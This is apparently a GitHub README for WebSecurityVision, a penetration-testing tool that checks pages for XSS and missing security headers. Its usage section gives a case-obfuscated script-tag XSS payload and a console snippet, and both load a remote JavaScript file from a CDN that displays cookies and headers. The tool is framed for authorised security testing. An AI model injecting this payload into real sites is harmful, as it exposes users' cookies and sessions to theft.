# WebSecurityVision

WebSecurityVision is a powerful tool for checking XSS vulnerabilities during the Pentest process. By calling the tool on a page, it can identify whether the site has an XSS vulnerability, and check to see if the security headers are set correctly. If the site has an XSS vulnerability and the security headers are not set correctly, the tool will display browser information, including cookies and headers related to the cybersecurity space.

<p align="center">
    <img alt="BetterCap" src="https://github.com/TheWation/WebSecurityVision/blob/master/github/screenshot.png?raw=true" height="300" />
</p>

This tool is an essential part of the penetration testing toolkit, as it enables security professionals to quickly and easily identify potential vulnerabilities in web applications. By identifying and addressing these vulnerabilities, security professionals can help prevent cyber attacks and protect sensitive data.

Overall, WebSecurityVision is a valuable tool that can help security professionals to identify and mitigate XSS vulnerabilities in web applications. It is easy to use, flexible, and highly effective, making it an essential part of any penetration testing toolkit.

## Usage

To use, enter the following code through the vulnerable section or enter the page through the Developer Console section.

Vulnerable Input:

```javascript
<ScRiPT SRC=https://cdn.jsdelivr.net/gh/TheWation/WebSecurityVision/vision.js></ScRiPT>
```

Inspect Element:

```javascript
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://cdn.jsdelivr.net/gh/TheWation/WebSecurityVision/vision.js';
document.head.appendChild(script);
```

## Disclaimer
For educational purposes only. Do not use for illegal activities. Use at your own risk. By using this tool, you agree to comply with all applicable laws and regulations. Unauthorized use is strictly prohibited. Always obtain permission before using this tool. No warranties.

## License

`WebSecurityVision` is made with ♥  by [Wation](https://github.com/TheWation) and it's released under the MIT license.